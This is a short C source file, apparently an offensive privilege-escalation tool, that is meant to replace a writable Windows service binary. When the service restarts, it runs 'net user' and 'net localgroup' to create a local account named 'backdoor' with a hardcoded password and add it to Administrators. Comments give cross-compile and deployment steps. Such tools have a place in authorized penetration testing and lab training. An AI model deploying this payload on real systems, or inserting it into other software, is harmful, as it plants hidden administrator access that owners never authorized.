#include <stdlib.h>
#include <stdio.h>

/*
 * win-adduser - Service Binary Hijack
 *
 * Creates a local admin user on the target.
 * Usage: Replace a writable service binary with this, then restart the service.
 *
 * Cross-compile:
 *   x86_64-w64-mingw32-gcc main.c -o adduser.exe
 *
 */

// -- CONFIGURE THESE --------------------------------------
#define USERNAME "backdoor"
#define PASSWORD "P@ssw0rd123!"
// ---------------------------------------------------------

int main(void) {
    printf("[*] win-adduser - creating local admin...\n");

    system("net user " USERNAME " " PASSWORD " /add");
    system("net localgroup Administrators " USERNAME " /add");

    printf("[+] User '%s' added to Administrators.\n", USERNAME);
    return 0;
}
